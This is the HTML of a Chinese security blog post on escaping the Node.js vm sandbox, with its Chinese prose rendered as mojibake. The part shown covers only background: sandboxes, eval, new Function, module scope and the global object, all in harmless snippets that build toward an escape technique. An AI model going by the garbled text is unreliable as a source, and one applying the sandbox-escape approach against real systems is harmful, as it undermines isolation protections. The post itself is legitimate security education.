<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="CTF,Java,Web,JavaScript,Linux">
    <meta name="description" content="è®°å½•ä¸€äº›å¥‡å¥‡æ€ªæ€ªä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿">
    <meta name="author" content="y1zh3e7">
    
    <title>
        
            VMæ²™ç®±é€ƒé€¸ |
        
        y1â€™s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/logo.jpg">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.jpg","favicon":"/images/logo.jpg","avatar":"/images/avatar.jpg","font_size":"21px","font_family":"STHeiti","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/cover.jpg","description":"ä¸€åªåç‰¢çš„webğŸ¶ || æ‡‚è¿›æ”»çŸ¥é˜²å®ˆï¼Œå…ˆæ­£å‘åé€†å‘","font_color":"#FFFFFF","hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI","appkey":"7gIuYJ9YQk94en6wRudankYd","server_urls":"https://ycemvr5n.api.lncldglobal.com","placeholder":"Hi speak somethingï¼"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"center","copyright_info":false},"version":"3.6.1"}
    KEEP.language_ago = {"second":"%s ç§’å‰","minute":"%s åˆ†é’Ÿå‰","hour":"%s å°æ—¶å‰","day":"%s å¤©å‰","week":"%s å‘¨å‰","month":"%s ä¸ªæœˆå‰","year":"%s å¹´å‰"}
    KEEP.language_code_block = {"copy":"å¤åˆ¶ä»£ç ","copied":"å·²å¤åˆ¶","fold":"æŠ˜å ä»£ç å—","folded":"å·²æŠ˜å "}
    KEEP.language_copy_copyright = {"copy":"å¤åˆ¶ç‰ˆæƒä¿¡æ¯","copied":"å·²å¤åˆ¶","title":"åŸæ–‡æ ‡é¢˜","author":"åŸæ–‡ä½œè€…","link":"åŸæ–‡é“¾æ¥"}
  </script>
<meta name="generator" content="Hexo 7.0.0-rc1">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="/images/logo.jpg">
                </a>
            
            <a class="logo-title" href="/">
               y1â€™s Blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                é¦–é¡µ
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                å½’æ¡£
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                æ ‡ç­¾
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                åˆ†ç±»
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                å‹é“¾
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                å…³äº
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">é¦–é¡µ</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">å½’æ¡£</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">æ ‡ç­¾</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">åˆ†ç±»</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">å‹é“¾</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">å…³äº</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            <div class="article-title">
                <span class="title-hover-animation">VMæ²™ç®±é€ƒé€¸</span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="/images/avatar.jpg">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">y1zh3e7</span>
                            
                                <span class="author-label">Lv1</span>
                            
                        </div>
                        <div class="meta-info">
                            
<div class="article-meta-info">
    <span class="article-date article-meta-item">
        
            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
        
        <span class="pc">2023-04-20 20:57:03</span>
        <span class="mobile">2023-04-20 20:57</span>
    </span>
    
        <span class="article-update-date article-meta-item">
        <i class="fas fa-file-pen"></i>&nbsp;
        <span class="pc">2023-04-20 20:59:54</span>
    </span>
    
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/WebSec/">WebSec</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/NodeJs/">NodeJs</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>4.8k å­—</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>19 åˆ†é’Ÿ</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                

                <p><strong>å‚è€ƒæ–‡ç« </strong>ï¼š<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62063669/article/details/125441529">https://blog.csdn.net/m0_62063669/article/details/125441529<i class="fas fa-external-link-alt"></i></a></p>
<p>â€‹                    <a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/u012961419/article/details/121281538">https://blog.csdn.net/u012961419/article/details/121281538<i class="fas fa-external-link-alt"></i></a></p>
<p>â€‹                    <a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/sunyctf/article/details/124434565">https://blog.csdn.net/sunyctf/article/details/124434565<i class="fas fa-external-link-alt"></i></a></p>
<p>â€‹                    <a class="link" target="_blank" rel="noopener" href="https://www.mianshigee.com/note/detail/27897wlr/#script-runinnewcontext-sandbox-options">https://www.mianshigee.com/note/detail/27897wlr/#script-runinnewcontext-sandbox-options<i class="fas fa-external-link-alt"></i></a></p>
<p>â€‹                    <a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/shawdow_bug/article/details/120072209?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-120072209-blog-119792059.pc_relevant_3mothn_strategy_and_data_recovery&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-120072209-blog-119792059.pc_relevant_3mothn_strategy_and_data_recovery&amp;utm_relevant_index=2">https://blog.csdn.net/shawdow_bug/article/details/120072209?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-120072209-blog-119792059.pc_relevant_3mothn_strategy_and_data_recovery&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-120072209-blog-119792059.pc_relevant_3mothn_strategy_and_data_recovery&amp;utm_relevant_index=2<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" target="_blank" rel="noopener" href="https://juejin.cn/post/6844904090116292616">Proxy å’Œ Reflect - æ˜é‡‘ (juejin.cn)<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/207283#h2-1">vm2å®ç°åŸç†åˆ†æ-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>â€‹                    <strong>Pç¥çŸ¥è¯†æ˜Ÿçƒ</strong></p>
<p>â€‹                    </p>
<h2 id="0x01-æ²™ç®±é€ƒé€¸åˆè¯†"><a href="#0x01-æ²™ç®±é€ƒé€¸åˆè¯†" class="headerlink" title="0x01 æ²™ç®±é€ƒé€¸åˆè¯†"></a><strong>0x01 æ²™ç®±é€ƒé€¸åˆè¯†</strong></h2><p>è¯´åˆ°æ²™ç®±é€ƒé€¸ï¼Œæˆ‘ä»¬å…ˆæ¥æ˜ç¡®ä¸€äº›åŸºæœ¬çš„æ¦‚å¿µã€‚</p>
<ul>
<li>JavaScriptå’ŒNodejsä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ï¼šJavaScriptç”¨åœ¨æµè§ˆå™¨å‰ç«¯ï¼Œåæ¥å°†Chromeä¸­çš„v8å¼•æ“å•ç‹¬æ‹¿å‡ºæ¥ä¸ºJavaScriptå•ç‹¬å¼€å‘äº†ä¸€ä¸ªè¿è¡Œç¯å¢ƒï¼Œå› æ­¤JavaScriptä¹Ÿå¯ä»¥ä½œä¸ºä¸€é—¨åç«¯è¯­è¨€ï¼Œå†™åœ¨åç«¯ï¼ˆæœåŠ¡ç«¯ï¼‰çš„JavaScriptå°±å«å«åšNodejsã€‚</li>
<li>ä»€ä¹ˆæ˜¯æ²™ç®±ï¼ˆsandboxï¼‰å½“æˆ‘ä»¬è¿è¡Œä¸€äº›å¯èƒ½ä¼šäº§ç”Ÿå±å®³çš„ç¨‹åºï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥åœ¨ä¸»æœºçš„çœŸå®ç¯å¢ƒä¸Šè¿›è¡Œæµ‹è¯•ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å•ç‹¬å¼€è¾Ÿä¸€ä¸ªè¿è¡Œä»£ç çš„ç¯å¢ƒï¼Œå®ƒä¸ä¸»æœºç›¸äº’éš”ç¦»ï¼Œä½†ä½¿ç”¨ä¸»æœºçš„ç¡¬ä»¶èµ„æºï¼Œæˆ‘ä»¬å°†æœ‰å±å®³çš„ä»£ç åœ¨æ²™ç®±ä¸­è¿è¡Œåªä¼šå¯¹æ²™ç®±å†…éƒ¨äº§ç”Ÿä¸€äº›å½±å“ï¼Œè€Œä¸ä¼šå½±å“åˆ°ä¸»æœºä¸Šçš„åŠŸèƒ½ï¼Œæ²™ç®±çš„å·¥ä½œæœºåˆ¶ä¸»è¦æ˜¯ä¾é é‡å®šå‘ï¼Œå°†æ¶æ„ä»£ç çš„æ‰§è¡Œç›®æ ‡é‡å®šå‘åˆ°æ²™ç®±å†…éƒ¨ã€‚</li>
<li>æ²™ç®±ï¼ˆsandboxï¼‰å’Œ è™šæ‹Ÿæœºï¼ˆVMï¼‰å’Œ å®¹å™¨ï¼ˆDockerï¼‰ä¹‹é—´çš„åŒºåˆ«ï¼šsandboxå’ŒVMä½¿ç”¨çš„éƒ½æ˜¯è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œä½†äºŒè€…é—´ä½¿ç”¨çš„ç›®çš„ä¸ä¸€æ ·ã€‚æ²™ç®±ç”¨æ¥éš”ç¦»æœ‰å®³ç¨‹åºï¼Œè€Œè™šæ‹Ÿæœºåˆ™å®ç°äº†æˆ‘ä»¬åœ¨ä¸€å°ç”µè„‘ä¸Šä½¿ç”¨å¤šä¸ªæ“ä½œç³»ç»Ÿçš„åŠŸèƒ½ã€‚Dockerå±äºsandboxçš„ä¸€ç§ï¼Œé€šè¿‡åˆ›é€ ä¸€ä¸ªæœ‰è¾¹ç•Œçš„è¿è¡Œç¯å¢ƒå°†ç¨‹åºæ”¾åœ¨é‡Œé¢ï¼Œä½¿ç¨‹åºè¢«è¾¹ç•Œå›°ä½ï¼Œä»è€Œä½¿ç¨‹åºä¸ç¨‹åºï¼Œç¨‹åºä¸ä¸»æœºä¹‹é—´ç›¸äº’éš”ç¦»å¼€ã€‚åœ¨å®é™…é˜²æŠ¤æ—¶ï¼Œä½¿ç”¨Dockerå’ŒsandboxåµŒå¥—çš„æ–¹å¼æ›´å¤šä¸€ç‚¹ï¼Œå®‰å…¨æ€§ä¹Ÿæ›´é«˜ã€‚</li>
<li>åœ¨Nodejsä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¼•å…¥vmæ¨¡å—æ¥åˆ›å»ºä¸€ä¸ªâ€œæ²™ç®±â€ï¼Œä½†å…¶å®è¿™ä¸ªvmæ¨¡å—çš„éš”ç¦»åŠŸèƒ½å¹¶ä¸å®Œå–„ï¼Œè¿˜æœ‰å¾ˆå¤šç¼ºé™·ï¼Œå› æ­¤Nodeåç»­å‡çº§äº†vmï¼Œä¹Ÿå°±æ˜¯ç°åœ¨çš„vm2æ²™ç®±ï¼Œvm2å¼•ç”¨äº†vmæ¨¡å—çš„åŠŸèƒ½ï¼Œå¹¶åœ¨å…¶åŸºç¡€ä¸Šåšäº†ä¸€äº›ä¼˜åŒ–ã€‚</li>
</ul>
<h2 id="0x02-Nodeå°†å­—ç¬¦ä¸²æ‰§è¡Œä¸ºä»£ç "><a href="#0x02-Nodeå°†å­—ç¬¦ä¸²æ‰§è¡Œä¸ºä»£ç " class="headerlink" title="0x02 Nodeå°†å­—ç¬¦ä¸²æ‰§è¡Œä¸ºä»£ç "></a><strong>0x02 Nodeå°†å­—ç¬¦ä¸²æ‰§è¡Œä¸ºä»£ç </strong></h2><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸¤ä¸ªåœ¨nodeä¸­å°†æŠŠå­—ç¬¦ä¸²æ‰§è¡Œæˆä»£ç çš„æ–¹å¼ã€‚</p>
<p><strong>æ–¹æ³•ä¸€ eval</strong></p>
<p>é¦–å…ˆæˆ‘åœ¨ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªage.txt</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> age = <span class="number">18</span></span><br></pre></td></tr></tbody></table></figure>

<p>åˆ›å»ºä¸€ä¸ªy1.js</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(<span class="string">'age.txt'</span>, <span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(content)</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(content)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age)</span><br></pre></td></tr></tbody></table></figure>

<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210100913712.png"></p>
<p>å¯ä»¥å‘ç°æˆ‘ä»¬é€šè¿‡evalæ‰§è¡Œäº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½†æ˜¯è¿™ç§æ‰§è¡Œæ–¹å¼å¦‚æœåœ¨å½“å‰ä½œç”¨åŸŸä¸‹å·²ç»æœ‰äº†åŒåçš„ageå˜é‡ï¼Œè¿™ä¸ªç¨‹åºå°±ä¼šæŠ¥é”™ã€‚</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210100917743.png"></p>
<p>åœ¨jsä¸­æ¯ä¸€ä¸ªæ¨¡å—éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„ä½œç”¨åŸŸï¼Œæ‰€ä»¥ç”¨evalæ‰§è¡Œå­—ç¬¦ä¸²ä»£ç å¾ˆå®¹æ˜“å‡ºç°ä¸Šé¢çš„è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å†çœ‹å¦å¤–ä¸€ç§æ–¹æ³•ã€‚</p>
<p><strong>æ–¹æ³•äºŒï¼šnew Function</strong></p>
<p>ä¸Šé¢çš„æ–¹æ³•å› ä¸ºæ¨¡å—é—´çš„ä½œç”¨åŸŸè¢«é™åˆ¶äº†ä½¿ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬è€ƒè™‘ä¸€ä¸‹å¦‚æœèƒ½å¤Ÿè‡ªå·±åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸæ˜¯ä¸æ˜¯å°±å¯ä»¥æ›´åŠ æ–¹ä¾¿çš„æ‰§è¡Œä»£ç å‘¢ï¼Ÿnew Functionçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å½¢å‚åç§°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å‡½æ•°ä½“ã€‚</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210100924849.png"></p>
<p>æˆ‘ä»¬éƒ½çŸ¥é“å‡½æ•°å†…å’Œå‡½æ•°å¤–æ˜¯ä¸¤ä¸ªä½œç”¨åŸŸï¼Œä¸è¿‡å½“åœ¨å‡½æ•°ä¸­çš„ä½œç”¨åŸŸæƒ³è¦ä½¿ç”¨å‡½æ•°å¤–çš„å˜é‡æ—¶ï¼Œè¦é€šè¿‡å½¢å‚æ¥ä¼ é€’ï¼Œå½“å‚æ•°è¿‡å¤šæ—¶è¿™ç§æ–¹æ³•å°±å˜çš„éº»çƒ¦èµ·æ¥äº†ã€‚</p>
<p>ä»ä¸Šé¢ä¸¤ä¸ªæ‰§è¡Œä»£ç çš„ä¾‹å­å¯ä»¥çœ‹å‡ºæ¥å…¶å®æˆ‘ä»¬çš„æ€æƒ³å°±æ˜¯å¦‚ä½•åˆ›å»ºä¸€ä¸ª<strong>èƒ½å¤Ÿé€šè¿‡ä¼ ä¸€ä¸ªå­—ç¬¦ä¸²å°±èƒ½æ‰§è¡Œä»£ç ï¼Œå¹¶ä¸”è¿˜ä¸å¤–éƒ¨éš”ç»çš„ä½œç”¨åŸŸ</strong>ï¼Œè¿™ä¹Ÿå°±æ˜¯vmæ¨¡å—çš„ä½œç”¨ã€‚</p>
<h2 id="0x03-Nodejsä½œç”¨åŸŸ"><a href="#0x03-Nodejsä½œç”¨åŸŸ" class="headerlink" title="0x03 Nodejsä½œç”¨åŸŸ"></a><strong>0x03 Nodejsä½œç”¨åŸŸ</strong></h2><p>è¯´åˆ°ä½œç”¨åŸŸï¼Œæˆ‘ä»¬å°±è¦è¯´ä¸€ä¸‹Nodeä¸­çš„ä½œç”¨åŸŸæ˜¯æ€ä¹ˆåˆ†é…çš„ï¼ˆåœ¨Nodeä¸­ä¸€èˆ¬æŠŠä½œç”¨åŸŸå«ä¸Šä¸‹æ–‡ï¼‰ã€‚</p>
<p>åœ¨Webç«¯ï¼ˆæµè§ˆå™¨ï¼‰ï¼Œå‘æŒ¥ä½œç”¨çš„ä¸€èˆ¬æ˜¯JavaScriptï¼Œå­¦è¿‡JavaScriptçš„å¸ˆå‚…åº”è¯¥éƒ½çŸ¥é“æˆ‘ä»¬æ‰“å¼€æµè§ˆå™¨çš„çª—å£æ˜¯JavaScriptä¸­æœ€å¤§çš„å¯¹è±¡<code>window</code>ï¼Œé‚£ä¹ˆåœ¨æœåŠ¡ç«¯å‘æŒ¥ä½œç”¨çš„Nodeå®ƒçš„æ„é€ å’ŒJavaScriptä¸å¤ªä¸€æ ·ã€‚</p>
<p>æˆ‘ä»¬åœ¨å†™ä¸€ä¸ªNodeé¡¹ç›®æ—¶å¾€å¾€è¦åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œruquireå…¶ä»–çš„jsæ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶æˆ‘ä»¬éƒ½ç»™å®ƒä»¬å«åšâ€œåŒ…â€ã€‚æ¯ä¸€ä¸ªåŒ…éƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„ä¸Šä¸‹æ–‡ï¼ŒåŒ…ä¹‹é—´çš„ä½œç”¨åŸŸæ˜¯äº’ç›¸éš”ç¦»ä¸äº’é€šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´å°±ç®—æˆ‘åœ¨y1.jsä¸­requireäº†y2.jsï¼Œé‚£ä¹ˆæˆ‘åœ¨y1.jsä¸­ä¹Ÿæ— æ³•ç›´æ¥è°ƒç”¨y2.jsä¸­çš„å˜é‡å’Œå‡½æ•°ï¼Œä¸¾ä¸ªä¾‹å­ã€‚</p>
<p>åœ¨åŒä¸€çº§ç›®å½•ä¸‹æœ‰<code>y1.js</code>å’Œ<code>y2.js</code>ä¸¤ä¸ªæ–‡ä»¶</p>
<p><code>y1.js</code></p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> age = <span class="number">20</span></span><br></pre></td></tr></tbody></table></figure>

<p><code>y2.js</code></p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="built_in">require</span>(<span class="string">"./y1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">age</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>è¿è¡Œy2.jså‘ç°æŠ¥é”™ <code>age</code> å€¼ä¸ºundefined</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121441474.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬æƒ³y2ä¸­å¼•å…¥å¹¶ä½¿ç”¨y1ä¸­çš„å…ƒç´ åº”è¯¥æ€ä¹ˆåŠå‘¢ï¼ŒNodeç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªå°†jsæ–‡ä»¶ä¸­å…ƒç´ è¾“å‡ºçš„æ¥å£<code>exports</code> ï¼ŒæŠŠy1ä¿®æ”¹æˆä¸‹é¢è¿™æ ·ï¼š</p>
<p><code>y1.js</code></p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> age = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exports</span>.<span class="property">age</span> = age</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬å†è¿è¡Œy2å°±å¯ä»¥æ‹¿åˆ°ageçš„å€¼äº†</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121445172.png"></p>
<p>æˆ‘ä»¬ç”¨å›¾æ¥è§£é‡Šè¿™ä¸¤ä¸ªåŒ…ä¹‹é—´çš„å…³ç³»å°±æ˜¯</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121449758.png"></p>
<p>è¿™ä¸ªæ—¶å€™å°±æœ‰äººä¼šé—®å·¦ä¸Šè§’çš„globalæ˜¯ä»€ä¹ˆï¼Ÿè¿™é‡Œå°±è¦è¯´åˆ°Nodejsä¸­çš„å…¨å±€å¯¹è±¡äº†ã€‚</p>
<p>åˆšæ‰æˆ‘ä»¬æåˆ°åœ¨JavaScriptä¸­<code>window</code>æ˜¯å…¨å±€å¯¹è±¡ï¼Œæµè§ˆå™¨å…¶ä»–æ‰€æœ‰çš„å±æ€§éƒ½æŒ‚è½½åœ¨<code>window</code>ä¸‹ï¼Œé‚£ä¹ˆåœ¨æœåŠ¡ç«¯çš„Nodejsä¸­å’Œ<code>window</code>ç±»ä¼¼çš„å…¨å±€å¯¹è±¡å«åš<code>global</code>ï¼ŒNodejsä¸‹å…¶ä»–çš„æ‰€æœ‰å±æ€§å’ŒåŒ…éƒ½æŒ‚è½½åœ¨è¿™ä¸ªglobalå¯¹è±¡ä¸‹ã€‚åœ¨globalä¸‹æŒ‚è½½äº†ä¸€äº›å…¨å±€å˜é‡ï¼Œæˆ‘ä»¬åœ¨è®¿é—®è¿™äº›å…¨å±€å˜é‡æ—¶ä¸éœ€è¦ç”¨<code>global.xxx</code>çš„æ–¹å¼æ¥è®¿é—®ï¼Œç›´æ¥ç”¨<code>xxx</code>å°±å¯ä»¥è°ƒç”¨è¿™ä¸ªå˜é‡ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œ<code>console</code>å°±æ˜¯æŒ‚è½½åœ¨globalä¸‹çš„ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæˆ‘ä»¬åœ¨ç”¨<code>console.log</code>è¾“å‡ºæ—¶å¹¶ä¸éœ€è¦å†™æˆ<code>global.console.log</code>ï¼Œå…¶ä»–å¸¸è§å…¨å±€å˜é‡è¿˜æœ‰processï¼ˆä¸€ä¼šé€ƒé€¸è¦ç”¨åˆ°ï¼‰ã€‚</p>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰‹åŠ¨å£°æ˜ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œä½†å…¨å±€å˜é‡åœ¨æ¯ä¸ªåŒ…ä¸­éƒ½æ˜¯å…±äº«çš„ï¼Œæ‰€ä»¥å°½é‡ä¸è¦å£°æ˜å…¨å±€å˜é‡ï¼Œä¸ç„¶å®¹æ˜“å¯¼è‡´å˜é‡æ±¡æŸ“ã€‚ç”¨ä¸Šé¢çš„ä»£ç ä¸¾ä¸ªä¾‹å­ï¼š</p>
<p><code>y1.js</code></p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">global</span>.<span class="property">age</span> = <span class="number">20</span></span><br></pre></td></tr></tbody></table></figure>

<p> <code>y2.js</code></p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="built_in">require</span>(<span class="string">"./y1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age)</span><br></pre></td></tr></tbody></table></figure>

<p>è¾“å‡ºï¼š</p>
<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121503613.png"></p>
